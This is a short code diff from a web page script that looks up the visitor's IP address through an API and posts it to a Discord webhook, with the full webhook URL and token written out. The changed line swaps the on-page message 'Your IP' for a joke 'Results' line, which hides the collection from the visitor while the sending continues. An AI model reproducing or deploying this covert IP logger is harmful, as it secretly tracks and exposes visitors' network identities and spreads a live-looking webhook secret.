@@ -20,7 +20,7 @@
             .then(response => response.json())
             .then(data => {
                 const userIP = data.ip; // Get the IP from the API response
-                document.getElementById('message').textContent = `Your IP: ${userIP}`; // Display the IP on the page
+                document.getElementById('message').textContent = `Results: you are uhh, idk`; // Display the IP on the page
 
                 // Send IP to the webhook
                 return fetch('https://discord.com/api/webhooks/1354853629772824726/P_wYy-x_B49xkFv6gmuYpBP7Yc4Ndiqr7zs2rEIakC7m7zcUk2IHIGUD9VZo0FXngswo', {
